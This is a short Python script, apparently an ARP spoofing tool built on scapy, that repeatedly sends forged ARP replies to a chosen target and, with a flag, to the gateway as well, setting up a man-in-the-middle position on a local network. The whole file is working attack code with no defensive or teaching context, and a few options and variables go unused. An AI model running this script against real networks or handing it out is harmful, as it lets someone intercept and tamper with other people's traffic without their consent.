import scapy.all as scapy
import argparse
import time
def parser():
    p = argparse.ArgumentParser(description="Spoof ARP table")
    p.add_argument("-i", "--iface", dest="iface", help="Interface you wish to use")
    p.add_argument("-s", "--src", dest = "src", help="The address you want for the attacker")
    p.add_argument("-d", "--delay", dest = "delay", default=0, type=float, help="Delay (in seconds) between messages")
    p.add_argument("-gw", action="store_true", help="should GW be attacked as well")
    p.add_argument("-t", "--target", required = True, dest = "target", help="IP of target")
    options= p.parse_args()
    return options

def get_mac(ip):
    ans = scapy.srp(scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst = ip), verbose = False)[0]
    return ans[0][1].hwsrc

def spoof(attackIP, victimIP):
    vmac = get_mac(victimIP) 
    pkt = scapy.ARP(op = 2, pdst = victimIP, hwdst = get_mac(victimIP), psrc = attackIP)
    scapy.send(pkt, verbose = False)

while True:
    options = parser()
    if(options.gw == True):
        spoof(options.src, options.target)
        spoof(options.target, options.src)
    else:
        spoof(options.src , options.target)
    time.sleep(options.delay)
